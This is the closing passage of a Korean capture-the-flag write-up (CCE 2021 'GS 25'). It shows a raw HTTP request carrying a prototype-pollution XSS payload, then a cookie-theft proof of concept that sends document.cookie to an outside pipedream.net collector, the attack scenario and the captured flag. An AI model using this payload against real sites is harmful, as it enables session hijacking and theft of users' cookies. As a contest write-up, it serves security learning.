+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/saveGame</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>20.194.62.226:4423</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>198</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/plain, */* Chrome/92.0.4515.107 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json;charset=UTF-8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>fileName=01f032bb-3210-4dd3-9555-078cfa75196d</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span><span class="attr">&quot;data&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;preventDefault&quot;</span><span class="punctuation">:</span><span class="string">&quot;x&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;handleObj&quot;</span><span class="punctuation">:</span><span class="string">&quot;x&quot;</span><span class="punctuation">,</span><span class="attr">&quot;delegateTarget&quot;</span><span class="punctuation">:</span><span class="string">&quot;&lt;img/src/onerror=alert(1)&gt;&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure>
+<p>일단 XSS가 잘 되는 지 확인 하기 위해 위와 같이 게임을 저장한 후에 loadGame() 함수를 실행시켜 보았다.</p>
+<p><img src="https://user-images.githubusercontent.com/49112423/134794962-40c6441c-6863-4a25-a588-9b56537e5935.png"></p>
+<p>예상대로 XSS 트리거가 잘 되는 것을 확인할 수 있었습니다.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;data&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;preventDefault&quot;:&quot;x&quot;, &quot;handleObj&quot;:&quot;x&quot;,&quot;delegateTarget&quot;:&quot;&lt;img/src/onerror=fetch(`https://79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net/f=`+document.cookie)&gt;&quot;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>쿠키 탈취 POC는 위와 같습니다.</p>
+<ul>
+<li><p>Scenario</p>
+<ul>
+<li>&#x2F;saveGame에서 Prototype Pollution POC를 저장한다.</li>
+<li>신고 로직에서 filename과 POC가 들어 있는 Code 번호를 넘긴다.</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://user-images.githubusercontent.com/49112423/134795008-eb26caf9-7fa3-4a69-a509-5a729ee8cd57.png"></p>
+<p>위 시나리오를 기반으로 익스를 시도 하니 플래그를 탈취할 수 있었습니다.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG : cce2021&#123;5cd5185ef46ce86f6c33543f75752a559fa843ec91a1176144f1a15d468f318d&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Summary"><span class="toc-number">1.</span> <span class="toc-text">Summary</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GS-25-2-pts"><span class="toc-number">2.</span> <span class="toc-text">GS 25 [2** pts]</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://blog.pocas.kr/2021/09/26/2021-09-26-CCE/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://blog.pocas.kr/2021/09/26/2021-09-26-CCE/&text=CCE 2021 GS 25 Write Up"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://blog.pocas.kr/2021/09/26/2021-09-26-CCE/&title=CCE 2021 GS 25 Write Up"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://blog.pocas.kr/2021/09/26/2021-09-26-CCE/&is_video=false&description=CCE 2021 GS 25 Write Up"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=CCE 2021 GS 25 Write Up&body=Check out this article: https://blog.pocas.kr/2021/09/26/2021-09-26-CCE/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://blog.pocas.kr/2021/09/26/2021-09-26-CCE/&title=CCE 2021 GS 25 Write Up"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://blog.pocas.kr/2021/09/26/2021-09-26-CCE/&title=CCE 2021 GS 25 Write Up"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://blog.pocas.kr/2021/09/26/2021-09-26-CCE/&title=CCE 2021 GS 25 Write Up"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://blog.pocas.kr/2021/09/26/2021-09-26-CCE/&title=CCE 2021 GS 25 Write Up"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://blog.pocas.kr/2021/09/26/2021-09-26-CCE/&name=CCE 2021 GS 25 Write Up&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://blog.pocas.kr/2021/09/26/2021-09-26-CCE/&t=CCE 2021 GS 25 Write Up"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020-2022
+    POCAS
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
